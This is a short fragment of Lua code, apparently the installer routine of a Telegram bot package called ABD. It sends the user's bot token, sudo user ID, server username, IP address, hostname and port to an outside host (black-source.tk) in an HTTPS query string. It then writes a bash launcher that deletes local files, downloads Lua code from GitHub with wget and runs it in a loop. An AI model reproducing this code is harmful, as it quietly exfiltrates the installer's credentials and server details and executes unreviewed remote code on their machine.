...
Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://black-source.tk/ABDTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Black::")
local RunBot = io.open("ABD", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/ABD
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr ABD.lua
wget "https://raw.githubusercontent.com/ABD/ABD/master/ABD.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./ABD.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
